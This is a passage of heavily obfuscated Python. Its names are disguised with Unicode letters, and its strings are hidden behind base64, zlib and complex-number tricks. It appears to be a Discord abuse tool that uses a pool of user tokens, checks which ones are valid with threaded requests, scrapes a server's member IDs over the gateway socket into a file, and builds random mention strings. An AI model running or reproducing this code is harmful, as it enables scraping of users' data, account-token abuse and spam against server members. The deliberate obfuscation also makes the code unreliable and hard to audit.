                    𝙨𝗲𝘵𝗮𝘁𝙩𝙧(𝙨𝘦𝙡𝙛, 'ranges', 𝘜𝘵𝗶𝘭𝘴.getRanges(𝘴𝙚𝗹𝙛.lastRange, 𝙧𝘰𝘂𝘯𝘥(𝘢𝗯𝘴(21.33871709653721 + 97.69677145471057j)), 𝙨𝙚𝘭𝙛.guilds[𝙨𝘦𝙡𝘧.guild_id][__𝘪𝙢𝙥𝗼𝘳𝘵__(𝘭𝙈𝘐𝙄𝙈𝗹𝙈𝙉𝗜𝘐𝘕𝙈𝘭𝘭𝙄𝘔𝘭𝙈𝙡𝗜𝗠𝗜𝘔𝙄𝗡𝗠𝗜𝗹𝙡𝗹𝙉𝙡[𝙧𝘰𝙪𝘯𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝘁__(𝙡𝗠𝗜𝗜𝗠𝙡𝙈𝗡𝙄𝙄𝙉𝙈𝙡𝘭𝘐𝙈𝙡𝘔𝘭𝘐𝙈𝘐𝙈𝙄𝗡𝗠𝘐𝘭𝘭𝗹𝙉𝙡[𝘳𝗼𝙪𝗻𝙙(𝙖𝘣𝘀(0.977035080735878 + 0.21307850903231973j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x8c0\xf2+K\t75\x00\x001\xc8\x05\x87')).decode()]))
                    𝘁𝙞𝘮𝘦.sleep(𝙧𝘰𝘂𝘯𝙙(𝗮𝘣𝙨(0.0 + 0j)) + 0.45)
                    𝘀𝙚𝘭𝗳.scrapeUsers()
            if 𝘀𝗲𝗹𝙛.endScraping:
                𝘴𝗲𝘭𝘧.close()

    def sock_close(self, ws, close_code, close_msg):
        pass

def scrape(token, guild_id, channel_id):
    𝙨𝗯 = 𝘋𝗶𝘴𝘤𝘰𝗿𝘥𝗦𝙤𝘤𝗸𝘦𝙩(𝘁𝙤𝘬𝘦𝙣, 𝘨𝘶𝙞𝘭𝙙_𝙞𝙙, 𝘤𝗵𝘢𝘯𝘯𝘦𝘭_𝙞𝘥)
    return 𝙨𝗯.run()

def scraper(guildid, channelid):
    with 𝘰𝘱𝙚𝗻(__𝙞𝙢𝘱𝘰𝘳𝘁__(𝘭𝙈𝙄𝘐𝙈𝗹𝙈𝙉𝙄𝗜𝘕𝗠𝙡𝗹𝙄𝙈𝘭𝗠𝘭𝙄𝙈𝙄𝗠𝘐𝗡𝘔𝙄𝘭𝗹𝙡𝗡𝘭[𝗿𝙤𝙪𝗻𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝘳𝘁__(𝘭𝗠𝘐𝘐𝗠𝗹𝘔𝗡𝘐𝙄𝙉𝘔𝙡𝗹𝘐𝙈𝗹𝙈𝙡𝙄𝗠𝘐𝗠𝘐𝘕𝙈𝙄𝗹𝙡𝘭𝙉𝙡[𝙧𝙤𝘂𝘯𝘥(𝙖𝘣𝘴(0.2585498009826084 + 0.9659979298175818j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb6,\x89\n7\xcc\x8c\x8a\xf0\xaa\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00^\xf6\x07\x91')).decode(), __𝗶𝘮𝙥𝙤𝗿𝘵__(𝗹𝗠𝗜𝘐𝘔𝗹𝘔𝙉𝗜𝙄𝙉𝙈𝘭𝘭𝗜𝗠𝘭𝗠𝗹𝗜𝗠𝗜𝙈𝙄𝗡𝙈𝙄𝙡𝘭𝗹𝙉𝙡[𝙧𝙤𝙪𝘯𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝙤𝘳𝙩__(𝗹𝘔𝘐𝘐𝙈𝘭𝘔𝗡𝗜𝙄𝘕𝙈𝗹𝗹𝗜𝙈𝙡𝗠𝗹𝗜𝗠𝘐𝙈𝙄𝘕𝙈𝘐𝙡𝙡𝗹𝙉𝙡[𝙧𝙤𝘶𝘯𝘥(𝗮𝘣𝙨(0.8861066867555092 + 0.4634813261472073j))]).decompress(b'x\xdaK\xa9,\xb6\x05\x00\x04"\x01\x8e')).decode()) as 𝙛:
        𝘧.truncate(𝘳𝘰𝘶𝘯𝙙(𝙖𝘣𝙨(0.0 + 0j)))
    𝙩𝙤𝘬𝘦𝗻 = __𝗶𝗺𝗽𝙤𝗿𝙩__(𝗹𝗠𝙄𝘐𝘔𝗹𝗠𝙉𝙄𝙄𝗡𝘔𝘭𝗹𝗜𝗠𝘭𝗠𝗹𝘐𝙈𝗜𝘔𝗜𝗡𝙈𝘐𝗹𝙡𝘭𝘕𝙡[𝗿𝙤𝘶𝙣𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝗿𝘁__(𝗹𝘔𝘐𝗜𝙈𝙡𝙈𝗡𝙄𝗜𝙉𝘔𝙡𝘭𝙄𝙈𝗹𝗠𝙡𝗜𝘔𝗜𝙈𝗜𝙉𝙈𝙄𝙡𝗹𝘭𝗡𝗹[𝘳𝗼𝘶𝘯𝘥(𝗮𝙗𝘴(0.38175241633923873 + 0.9242646226158137j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()
    𝙩𝗼𝙠𝗲𝘯𝘀𝙞𝘯𝙜𝘂𝙞𝙡𝙙 = []
    𝘁𝘰𝗸𝗲𝙣 = 𝗿𝘢𝙣𝘥𝙤𝙢.choice(𝘵𝙤𝙠𝘦𝘯𝙨)
    𝙪𝗿𝘭 = __𝙞𝘮𝙥𝘰𝗿𝘵__(𝗹𝘔𝘐𝘐𝘔𝙡𝗠𝘕𝗜𝗜𝘕𝘔𝘭𝙡𝙄𝘔𝙡𝘔𝘭𝙄𝙈𝙄𝗠𝗜𝘕𝘔𝙄𝘭𝘭𝙡𝙉𝙡[𝙧𝗼𝘶𝘯𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝙤𝗿𝘁__(𝗹𝙈𝗜𝙄𝗠𝙡𝘔𝙉𝗜𝙄𝗡𝙈𝘭𝙡𝗜𝙈𝙡𝙈𝘭𝙄𝙈𝙄𝗠𝙄𝘕𝙈𝙄𝗹𝘭𝙡𝙉𝙡[𝘳𝘰𝘶𝘯𝙙(𝘢𝙗𝘴(0.21680907477656586 + 0.976214026274223j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\x04\x00\x8cJ\x10\x7f')).decode().format(𝗴𝘶𝙞𝘭𝘥𝘪𝙙)

    def checktokens(token):
        𝘳 = 𝘳𝗲𝗾𝘂𝙚𝘀𝙩𝘀.get(𝘶𝘳𝙡, headers={__𝙞𝗺𝗽𝗼𝘳𝘁__(𝗹𝗠𝘐𝙄𝘔𝙡𝗠𝗡𝙄𝘐𝗡𝘔𝘭𝙡𝙄𝗠𝘭𝘔𝙡𝘐𝗠𝗜𝘔𝙄𝙉𝙈𝘐𝘭𝙡𝙡𝘕𝗹[𝙧𝘰𝙪𝘯𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝙧𝘵__(𝘭𝘔𝙄𝙄𝗠𝗹𝘔𝘕𝘐𝗜𝗡𝗠𝙡𝗹𝘐𝙈𝘭𝗠𝗹𝗜𝗠𝗜𝘔𝘐𝗡𝗠𝘐𝙡𝗹𝗹𝙉𝙡[𝗿𝙤𝘶𝙣𝗱(𝙖𝘣𝘀(0.9352093270895616 + 0.35409534665777426j))]).decompress(b'x\xda\x8b\x8c\x083Ht\xb7\xacL\x8c(\xc8Hq\xcf)KJ\xb7\xb5\x05\x00G\xff\x06\xf3')).decode(): 𝘁𝗼𝘬𝗲𝗻})
        if 𝙧.status_code == 𝘳𝗼𝘶𝙣𝙙(𝙖𝙗𝘴(199.37562156549419 + 15.791185052834047j)):
            𝘁𝗼𝗸𝙚𝙣𝙨𝘪𝗻𝘨𝘂𝘪𝙡𝗱.append(𝙩𝗼𝙠𝙚𝙣)
    𝘁𝘩𝘳𝙚𝗮𝘥𝘀 = []
    for 𝘁𝘰𝙠𝙚𝘯 in 𝘵𝘰𝗸𝙚𝘯𝘀:
        𝘁 = 𝘁𝙝𝘳𝙚𝙖𝙙𝙞𝙣𝙜.Thread(target=𝘤𝙝𝗲𝘤𝘬𝙩𝙤𝘬𝘦𝙣𝘀, args=(__𝙞𝙢𝘱𝘰𝙧𝙩__(𝙡𝗠𝘐𝗜𝘔𝘭𝘔𝙉𝙄𝘐𝗡𝘔𝙡𝘭𝗜𝗠𝗹𝘔𝙡𝘐𝙈𝘐𝗠𝘐𝙉𝘔𝗜𝙡𝘭𝘭𝙉𝙡[𝗿𝙤𝘶𝘯𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝘳𝘵__(𝘭𝘔𝘐𝗜𝗠𝘭𝙈𝙉𝙄𝗜𝗡𝙈𝘭𝘭𝗜𝙈𝘭𝗠𝙡𝙄𝗠𝙄𝗠𝘐𝗡𝙈𝙄𝘭𝗹𝙡𝘕𝗹[𝘳𝙤𝙪𝙣𝙙(𝘢𝘣𝙨(0.3483899166660648 + 0.9373497031340078j))]).decompress(b'x\xdaK56\xb0\x05\x00\x02\xce\x01\x06')).decode().format(𝘁𝗼𝘬𝗲𝙣),))
        𝘵.start()
        𝙩𝗵𝘳𝙚𝗮𝗱𝘴.append(𝙩)
    for 𝘵 in 𝘵𝘩𝗿𝘦𝗮𝘥𝙨:
        𝙩.join()
    try:
        𝙩𝙤𝘬𝗲𝙣 = 𝗿𝙖𝙣𝗱𝙤𝘮.choice(𝙩𝙤𝗸𝙚𝗻𝘴𝙞𝗻𝗴𝘶𝙞𝗹𝙙)
    except:
        𝗽𝘳𝙞𝘯𝘵(__𝙞𝙢𝗽𝗼𝘳𝘁__(𝙡𝙈𝘐𝘐𝘔𝙡𝘔𝙉𝘐𝘐𝘕𝗠𝙡𝗹𝗜𝘔𝙡𝘔𝘭𝙄𝗠𝘐𝗠𝘐𝘕𝘔𝙄𝘭𝙡𝘭𝙉𝗹[𝙧𝗼𝙪𝙣𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__(𝙡𝗠𝙄𝙄𝗠𝘭𝙈𝗡𝙄𝗜𝗡𝙈𝗹𝙡𝘐𝗠𝘭𝗠𝙡𝙄𝘔𝘐𝙈𝘐𝗡𝙈𝙄𝘭𝗹𝗹𝗡𝗹[𝙧𝗼𝘶𝘯𝗱(𝗮𝗯𝙨(0.49624739192836875 + 0.8681811596690474j))]).decompress(b'x\xdaK\xca\xb5HO\xc9u+N\x0c\x0fLOq\xb7,\x8a\n7\xad\xf2t\xcf)\xf5tO1L\x0c\xaf\xc8\x06\x00\xbb\x98\x0bP')).decode())
        𝗲𝙭𝙞𝘵(𝘳𝘰𝘂𝙣𝗱(𝗮𝗯𝘴(0.0 + 0j)))
    𝘮𝘦𝘮𝗯𝗲𝙧𝘴 = 𝙨𝘤𝘳𝗮𝗽𝘦(𝘁𝘰𝙠𝘦𝘯, __𝗶𝗺𝙥𝙤𝘳𝘁__(𝙡𝙈𝘐𝙄𝘔𝙡𝘔𝗡𝘐𝘐𝙉𝘔𝙡𝗹𝘐𝙈𝗹𝙈𝙡𝙄𝙈𝗜𝘔𝘐𝗡𝙈𝘐𝙡𝗹𝗹𝙉𝙡[𝗿𝘰𝘶𝙣𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝗿𝘵__(𝙡𝙈𝙄𝗜𝙈𝙡𝘔𝗡𝗜𝙄𝗡𝙈𝙡𝘭𝘐𝗠𝙡𝘔𝙡𝘐𝗠𝘐𝘔𝘐𝙉𝘔𝘐𝗹𝙡𝘭𝘕𝗹[𝗿𝘰𝘶𝘯𝙙(𝗮𝙗𝙨(0.840972296765982 + 0.5410781792607693j))]).decompress(b'x\xdaK56\xb0\x05\x00\x02\xce\x01\x06')).decode().format(𝘨𝙪𝗶𝘭𝙙𝘪𝙙), __𝗶𝘮𝙥𝗼𝙧𝙩__(𝙡𝘔𝗜𝗜𝙈𝗹𝙈𝘕𝘐𝗜𝗡𝗠𝙡𝗹𝗜𝙈𝘭𝗠𝘭𝘐𝗠𝙄𝙈𝙄𝙉𝘔𝗜𝗹𝙡𝗹𝙉𝗹[𝗿𝘰𝘂𝘯𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝗿𝙩__(𝘭𝘔𝗜𝙄𝘔𝘭𝙈𝙉𝗜𝘐𝙉𝘔𝙡𝘭𝗜𝘔𝙡𝙈𝙡𝘐𝗠𝘐𝙈𝘐𝙉𝙈𝘐𝙡𝘭𝙡𝘕𝘭[𝗿𝙤𝘂𝘯𝘥(𝗮𝘣𝘴(0.06283483262737011 + 0.998023939496789j))]).decompress(b'x\xdaK56\xb0\x05\x00\x02\xce\x01\x06')).decode().format(𝙘𝙝𝙖𝙣𝘯𝙚𝘭𝙞𝘥))
    for 𝗺𝙚𝗺𝘣𝘦𝙧 in 𝗺𝘦𝙢𝙗𝙚𝙧𝘴:
        𝘰𝘱𝙚𝘯(__𝙞𝙢𝙥𝙤𝗿𝘁__(𝗹𝘔𝗜𝙄𝙈𝙡𝘔𝗡𝘐𝗜𝘕𝘔𝙡𝘭𝘐𝘔𝙡𝙈𝘭𝗜𝙈𝗜𝗠𝘐𝙉𝙈𝗜𝘭𝙡𝙡𝙉𝘭[𝗿𝙤𝘂𝘯𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝘳𝘵__(𝙡𝘔𝗜𝙄𝘔𝗹𝙈𝗡𝗜𝘐𝗡𝙈𝗹𝗹𝙄𝘔𝙡𝙈𝗹𝙄𝘔𝘐𝗠𝗜𝗡𝘔𝘐𝙡𝗹𝘭𝗡𝙡[𝙧𝗼𝙪𝗻𝗱(𝗮𝙗𝙨(0.6622596000418559 + 0.7492744638331144j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb6,\x89\n7\xcc\x8c\x8a\xf0\xaa\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00^\xf6\x07\x91')).decode(), __𝘪𝙢𝙥𝗼𝘳𝙩__(𝙡𝘔𝙄𝗜𝘔𝙡𝗠𝗡𝗜𝘐𝘕𝗠𝗹𝗹𝗜𝙈𝘭𝗠𝙡𝘐𝘔𝙄𝘔𝙄𝙉𝘔𝙄𝗹𝙡𝗹𝘕𝘭[𝘳𝙤𝘶𝘯𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝘳𝙩__(𝘭𝗠𝗜𝙄𝗠𝙡𝘔𝙉𝗜𝗜𝙉𝗠𝙡𝘭𝘐𝘔𝘭𝙈𝙡𝙄𝙈𝗜𝗠𝙄𝘕𝗠𝙄𝘭𝗹𝘭𝙉𝘭[𝗿𝘰𝘶𝘯𝗱(𝙖𝘣𝘀(0.2370753162582374 + 0.97149127346624j))]).decompress(b'x\xda\x8b\x0c.\xb6\x05\x00\x03\x84\x01]')).decode()).write(𝘟𝘵𝙟93𝗚𝗡𝙈𝘘𝘜𝗠𝙭𝘪𝙚𝙜2𝗖𝗞𝘶𝙗𝘃𝗶𝘀𝘏6𝗭𝙕𝙬𝗲86𝘴.mro()[7](𝙢𝙚𝗺𝘣𝗲𝘳) + __𝘪𝘮𝗽𝘰𝙧𝘁__(𝘭𝘔𝘐𝘐𝘔𝘭𝘔𝙉𝘐𝙄𝘕𝘔𝗹𝗹𝙄𝘔𝘭𝘔𝘭𝗜𝙈𝗜𝗠𝙄𝗡𝙈𝘐𝗹𝘭𝙡𝘕𝘭[𝘳𝘰𝘶𝘯𝗱(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝘰𝗿𝘵__(𝙡𝘔𝗜𝙄𝙈𝙡𝘔𝙉𝙄𝘐𝗡𝗠𝙡𝘭𝙄𝘔𝗹𝘔𝙡𝘐𝙈𝙄𝙈𝙄𝗡𝗠𝗜𝘭𝗹𝘭𝙉𝗹[𝘳𝘰𝘂𝘯𝙙(𝘢𝘣𝙨(0.9379551763566177 + 0.3467565243017442j))]).decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())

def getrandomids(ids):
    with 𝘰𝘱𝙚𝙣(__𝘪𝗺𝘱𝘰𝗿𝙩__(𝙡𝙈𝗜𝘐𝙈𝘭𝙈𝗡𝘐𝘐𝗡𝘔𝗹𝘭𝘐𝘔𝙡𝗠𝙡𝗜𝘔𝗜𝙈𝘐𝙉𝗠𝙄𝗹𝘭𝘭𝙉𝙡[𝘳𝗼𝙪𝗻𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝘳𝘁__(𝘭𝙈𝘐𝙄𝙈𝙡𝘔𝘕𝙄𝙄𝙉𝘔𝙡𝘭𝘐𝘔𝘭𝙈𝘭𝘐𝘔𝘐𝗠𝗜𝙉𝘔𝗜𝙡𝙡𝘭𝘕𝙡[𝘳𝗼𝘂𝗻𝗱(𝙖𝗯𝙨(0.06895348164498127 + 0.9976198761898418j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb6,\x89\n7\xcc\x8c\x8a\xf0\xaa\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00^\xf6\x07\x91')).decode().format(), __𝙞𝙢𝘱𝘰𝘳𝙩__(𝙡𝗠𝙄𝗜𝘔𝘭𝗠𝗡𝗜𝗜𝘕𝗠𝘭𝙡𝗜𝗠𝘭𝙈𝙡𝙄𝗠𝙄𝙈𝙄𝗡𝙈𝗜𝙡𝘭𝗹𝙉𝙡[𝙧𝗼𝙪𝗻𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__(𝘭𝘔𝙄𝘐𝙈𝙡𝗠𝙉𝙄𝗜𝘕𝙈𝙡𝗹𝗜𝗠𝙡𝙈𝗹𝙄𝗠𝘐𝙈𝗜𝘕𝘔𝘐𝙡𝗹𝘭𝗡𝘭[𝗿𝗼𝘂𝘯𝙙(𝙖𝗯𝘴(0.6487804597755492 + 0.7609756336528963j))]).decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝘪𝙢𝙥𝘰𝘳𝘁__(𝙡𝙈𝘐𝗜𝙈𝘭𝘔𝙉𝙄𝘐𝘕𝘔𝘭𝘭𝗜𝙈𝙡𝘔𝙡𝗜𝗠𝗜𝗠𝗜𝙉𝘔𝙄𝘭𝘭𝘭𝙉𝗹[𝘳𝗼𝙪𝘯𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝗿𝘁__(𝘭𝘔𝘐𝗜𝘔𝘭𝗠𝗡𝙄𝗜𝙉𝗠𝙡𝗹𝘐𝙈𝘭𝘔𝗹𝙄𝙈𝙄𝘔𝙄𝘕𝗠𝙄𝘭𝘭𝙡𝙉𝘭[𝘳𝘰𝙪𝙣𝙙(𝗮𝗯𝘴(0.7359790871338888 + 0.6770042712579941j))]).decompress(b'x\xdaK\x89\x08\xca\xf5w\xb4\xb5\x05\x00\x0cS\x02\x86')).decode()) as 𝘧:
        𝙙𝘪𝘴𝙘𝗼𝙧𝙙_𝘶𝘀𝗲𝙧𝙨 = [𝗹𝘪𝗻𝘦.strip() for 𝘭𝗶𝘯𝘦 in 𝗳.readlines()]
    𝘳𝗮𝗻𝙙𝙤𝙢_𝗶𝗱𝘀 = 𝙧𝗮𝘯𝙙𝘰𝘮.sample(𝙙𝘪𝘴𝗰𝙤𝘳𝘥_𝘶𝘀𝘦𝘳𝘴, 𝘪𝙙𝘴)
    return __𝘪𝘮𝘱𝗼𝘳𝘁__(𝙡𝗠𝗜𝗜𝘔𝙡𝙈𝗡𝘐𝗜𝗡𝗠𝗹𝙡𝙄𝘔𝘭𝗠𝘭𝗜𝘔𝙄𝙈𝗜𝗡𝙈𝘐𝘭𝗹𝘭𝙉𝘭[𝙧𝘰𝘂𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝗿𝙩__(𝗹𝘔𝗜𝙄𝙈𝘭𝙈𝙉𝗜𝙄𝙉𝙈𝗹𝙡𝗜𝘔𝘭𝙈𝙡𝘐𝙈𝗜𝗠𝘐𝗡𝗠𝙄𝘭𝘭𝘭𝘕𝙡[𝙧𝗼𝘂𝗻𝙙(𝙖𝗯𝘴(0.327588934162077 + 0.9448203481162725j))]).decompress(b'x\xda\xf3t6H\xf7\xf4\xa8\xb0\xf0t\xa9p\xf4\x0c\xb4\xb5\x05\x00(\x9b\x04\xbf')).decode() + __𝙞𝗺𝗽𝙤𝗿𝙩__(𝙡𝘔𝘐𝗜𝗠𝙡𝙈𝘕𝗜𝗜𝘕𝙈𝙡𝗹𝙄𝙈𝗹𝙈𝗹𝙄𝗠𝗜𝘔𝙄𝙉𝘔𝙄𝘭𝗹𝗹𝘕𝗹[𝗿𝙤𝙪𝗻𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝗼𝘳𝙩__(𝗹𝗠𝗜𝗜𝘔𝙡𝘔𝗡𝗜𝗜𝘕𝗠𝗹𝙡𝗜𝗠𝘭𝙈𝗹𝘐𝘔𝗜𝗠𝗜𝗡𝗠𝙄𝘭𝘭𝗹𝙉𝙡[𝘳𝗼𝘂𝘯𝗱(𝘢𝗯𝘀(0.6389888371252197 + 0.7692160073928256j))]).decompress(b'x\xda\x0b\xc8t\xb2H\xf3\xa8\xb0\xf0t\xa9p\xf4\x0c\xb4\xb5\x05\x00+:\x04\xec')).decode().join(𝗿𝘢𝗻𝙙𝘰𝗺_𝘪𝙙𝘀) + __𝘪𝗺𝘱𝙤𝗿𝘵__(𝙡𝙈𝗜𝘐𝗠𝘭𝗠𝗡𝘐𝗜𝗡𝘔𝘭𝘭𝙄𝙈𝘭𝘔𝙡𝘐𝘔𝗜𝙈𝙄𝙉𝘔𝗜𝙡𝙡𝙡𝘕𝙡[𝙧𝘰𝘶𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝗿𝙩__(𝙡𝗠𝙄𝙄𝘔𝙡𝘔𝙉𝘐𝙄𝙉𝙈𝙡𝗹𝗜𝙈𝙡𝗠𝙡𝘐𝗠𝘐𝘔𝗜𝘕𝘔𝗜𝙡𝙡𝗹𝗡𝙡[𝙧𝗼𝙪𝙣𝗱(𝗮𝘣𝙨(0.8702230788822218 + 0.49265788634786545j))]).decompress(b'x\xda\x0b\xc8t\xb2Hs\xb4\xb5\x05\x00\x0b\x1d\x02U')).decode()

def Headers(token):
    return {__𝗶𝙢𝙥𝘰𝙧𝙩__(𝙡𝙈𝙄𝙄𝙈𝘭𝘔𝘕𝘐𝘐𝙉𝘔𝙡𝘭𝘐𝗠𝘭𝗠𝘭𝗜𝗠𝘐𝙈𝙄𝗡𝙈𝘐𝘭𝙡𝙡𝘕𝘭[𝙧𝙤𝘶𝙣𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝘳𝘁__(𝙡𝗠𝘐𝗜𝙈𝗹𝙈𝘕𝘐𝗜𝘕𝙈𝘭𝙡𝗜𝗠𝙡𝙈𝗹𝗜𝘔𝙄𝗠𝙄𝗡𝙈𝘐𝘭𝘭𝙡𝙉𝗹[𝙧𝙤𝘂𝗻𝗱(𝙖𝙗𝙨(0.03515939838513393 + 0.999381717215797j))]).decompress(b'x\xda\x0b\x8c\x083Ht\xb7\xacL\x8c(\xc8Hq\xcf)KJ\xb7\xb5\x05\x00G_\x06\xeb')).decode(): 𝙩𝗼𝘬𝘦𝘯, __𝙞𝗺𝘱𝘰𝙧𝘵__(𝙡𝘔𝙄𝙄𝘔𝙡𝗠𝙉𝘐𝗜𝘕𝗠𝙡𝙡𝘐𝗠𝙡𝗠𝗹𝘐𝘔𝘐𝘔𝗜𝘕𝘔𝙄𝘭𝗹𝘭𝘕𝘭[𝘳𝘰𝙪𝙣𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝗿𝘵__(𝙡𝗠𝗜𝘐𝙈𝘭𝘔𝙉𝘐𝗜𝗡𝙈𝗹𝘭𝙄𝘔𝙡𝘔𝗹𝙄𝗠𝘐𝗠𝙄𝙉𝗠𝗜𝙡𝗹𝗹𝗡𝘭[𝘳𝙤𝘶𝘯𝗱(𝙖𝙗𝘀(0.4071203473702909 + 0.9133745249113825j))]).decompress(b'x\xda\x8b\x8c\x083Ht\xb7\xacL\x8c\x082\x05\x00\x19\x1d\x03\xd2')).decode(): __𝙞𝗺𝙥𝗼𝙧𝙩__(𝗹𝘔𝗜𝗜𝘔𝙡𝙈𝗡𝘐𝘐𝗡𝘔𝙡𝘭𝗜𝗠𝙡𝘔𝘭𝘐𝙈𝗜𝗠𝗜𝙉𝙈𝗜𝗹𝙡𝙡𝘕𝗹[𝘳𝙤𝘂𝘯𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝘳𝘵__(𝙡𝙈𝗜𝙄𝘔𝙡𝗠𝙉𝗜𝙄𝘕𝘔𝗹𝘭𝘐𝘔𝘭𝙈𝙡𝘐𝘔𝙄𝙈𝗜𝗡𝙈𝘐𝗹𝘭𝘭𝗡𝗹[𝙧𝘰𝘶𝘯𝗱(𝗮𝗯𝘴(0.04233113695160873 + 0.9991036356877019j))]).decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr6\xcdJ22\xb0\x05\x00-p\x05\x02')).decode(), __𝙞𝙢𝘱𝘰𝗿𝘁__(𝘭𝘔𝗜𝗜𝗠𝗹𝙈𝙉𝙄𝙄𝘕𝗠𝙡𝘭𝗜𝗠𝗹𝘔𝗹𝙄𝗠𝗜𝘔𝙄𝗡𝘔𝗜𝗹𝘭𝙡𝗡𝗹[𝗿𝙤𝙪𝗻𝗱(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝘰𝘳𝙩__(𝗹𝘔𝗜𝘐𝘔𝙡𝙈𝗡𝘐𝙄𝘕𝙈𝙡𝘭𝗜𝘔𝘭𝙈𝘭𝗜𝙈𝙄𝘔𝘐𝙉𝘔𝗜𝗹𝘭𝗹𝗡𝙡[𝘳𝙤𝙪𝙣𝙙(𝘢𝗯𝙨(0.5800107739944365 + 0.814608803076897j))]).decompress(b'x\xda\x8b\x0c\xf7\xcb\x8a\x8ap2\x00\x00\x0c;\x02\x8d')).decode(): __𝙞𝘮𝗽𝘰𝗿𝘁__(𝙡𝗠𝗜𝙄𝘔𝘭𝙈𝘕𝘐𝙄𝗡𝗠𝗹𝗹𝘐𝘔𝘭𝗠𝗹𝗜𝙈𝘐𝙈𝙄𝘕𝗠𝙄𝗹𝘭𝙡𝗡𝘭[𝙧𝘰𝘂𝘯𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝗿𝘵__(𝗹𝗠𝘐𝙄𝘔𝗹𝘔𝗡𝘐𝙄𝙉𝙈𝗹𝘭𝗜𝘔𝙡𝗠𝙡𝙄𝙈𝗜𝘔𝘐𝘕𝙈𝙄𝗹𝙡𝘭𝘕𝘭[𝘳𝙤𝙪𝙣𝘥(𝗮𝙗𝘴(0.2885668003736269 + 0.9574597650669856j))]).decompress(b'x\xda\xf3\xce\xb4(\x04\x00\x03L\x01^')).decode(), __𝙞𝙢𝙥𝙤𝗿𝘵__(𝗹𝘔𝙄𝙄𝘔𝗹𝙈𝗡𝗜𝘐𝙉𝗠𝘭𝙡𝘐𝗠𝘭𝗠𝙡𝗜𝙈𝘐𝗠𝘐𝙉𝘔𝙄𝗹𝗹𝙡𝗡𝙡[𝗿𝗼𝘶𝗻𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝙤𝘳𝙩__(𝙡𝗠𝙄𝙄𝙈𝘭𝗠𝘕𝘐𝘐𝘕𝙈𝘭𝙡𝗜𝗠𝗹𝘔𝙡𝙄𝗠𝘐𝙈𝗜𝗡𝙈𝘐𝘭𝙡𝗹𝘕𝙡[𝗿𝙤𝘶𝗻𝙙(𝙖𝙗𝙨(0.7840383267929066 + 0.6207124149876329j))]).decompress(b'x\xda\x8b\x0c\xf7\xcb\x8a\x8ap2\xf0\t\xaf\xc8H\xcaM1\x8c\x0cO\xc9\x01\x00Gq\x06\xf4')).decode(): __𝘪𝗺𝘱𝘰𝙧𝘁__(𝙡𝙈𝙄𝙄𝘔𝙡𝗠𝗡𝗜𝘐𝘕𝙈𝗹𝘭𝘐𝘔𝙡𝙈𝘭𝙄𝘔𝗜𝗠𝗜𝗡𝘔𝗜𝘭𝙡𝙡𝘕𝙡[𝙧𝙤𝙪𝗻𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__(𝘭𝙈𝙄𝗜𝙈𝙡𝘔𝙉𝗜𝘐𝗡𝙈𝘭𝘭𝘐𝙈𝙡𝙈𝙡𝗜𝗠𝙄𝘔𝘐𝗡𝗠𝗜𝙡𝘭𝗹𝘕𝘭[𝙧𝘰𝙪𝘯𝘥(𝘢𝙗𝘀(0.49035598551606674 + 